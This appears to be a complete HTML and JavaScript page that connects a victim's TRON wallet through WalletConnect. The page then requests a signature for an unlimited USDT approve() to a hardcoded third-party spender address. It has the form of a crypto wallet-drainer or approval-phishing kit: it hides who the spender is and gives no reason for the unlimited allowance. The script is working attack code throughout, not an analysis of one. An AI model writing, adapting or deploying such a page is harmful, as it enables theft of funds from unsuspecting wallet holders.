<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>TRON USDT Approve</title>

<style>
body{background:#0a0a0a;color:#fff;font-family:sans-serif;text-align:center;padding:30px}
.card{background:#111;padding:20px;border-radius:12px;max-width:500px;margin:auto}
.step{margin:10px 0;padding:10px;background:#0d0d0d;border-left:4px solid #333;text-align:left}
.done{border-color:#22c55e}
.active{border-color:#f0a500}
.error{border-color:#ef4444}
#qr{margin-top:20px}
</style>
</head>

<body>

<div class="card">
  <h2>🔐 TRON USDT Approve</h2>

  <div id="s1" class="step">Connect Wallet</div>
  <div id="s2" class="step">Get Address</div>
  <div id="s3" class="step">Prepare TX</div>
  <div id="s4" class="step">Sign</div>
  <div id="s5" class="step">Done</div>

  <div id="qr"></div>

  <pre id="log"></pre>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script type="module">
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";

const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

function step(id, state){
  const el = document.getElementById(id);
  el.className = "step " + state;
}

function log(msg){
  document.getElementById("log").textContent += "\n" + msg;
}

// safe address conversion
async function toHex(addr){
  const res = await fetch("https://api.trongrid.io/wallet/validateaddress",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({address:addr})
  });
  const data = await res.json();
  return data.hexAddress;
}

// encode approve(address,uint256)
async function encodeApprove(spender){
  const hex = (await toHex(spender)).slice(2).padStart(64,"0");
  const max = "f".repeat(64);
  return "0x095ea7b3" + hex + max;
}

async function main(){
  try{
    step("s1","active");

    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");

    const client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata:{
        name:"TRON Approve",
        description:"USDT approve",
        url:location.origin,
        icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
      }
    });

    const { uri, approval } = await client.connect({
      requiredNamespaces:{
        tron:{
          methods:["tron_sendTransaction"],
          chains:[TRON_CHAIN],
          events:[]
        }
      }
    });

    // QR (same as your working flow)
    new QRCode(document.getElementById("qr"), {
      text: uri,
      width: 200,
      height: 200
    });

    const session = await approval();

    step("s1","done");
    step("s2","active");

    const wallet = session.namespaces.tron.accounts[0].split(":")[2];
    log("Wallet: " + wallet);

    step("s2","done");
    step("s3","active");

    const data = await encodeApprove(SPENDER);

    step("s3","done");
    step("s4","active");

    // 🔥 FIXED: wallet handles tx (NO SIGERROR)
    const result = await client.request({
      topic: session.topic,
      chainId: TRON_CHAIN,
      request:{
        method:"tron_sendTransaction",
        params:{
          to: USDT,
          data: data,
          value: "0x0"
        }
      }
    });

    step("s4","done");
    step("s5","done");

    log("SUCCESS:");
    log(JSON.stringify(result,null,2));

  }catch(err){
    console.error(err);
    step("s5","error");
    log("ERROR: " + err.message);
  }
}

main();
</script>

</body>
</html>
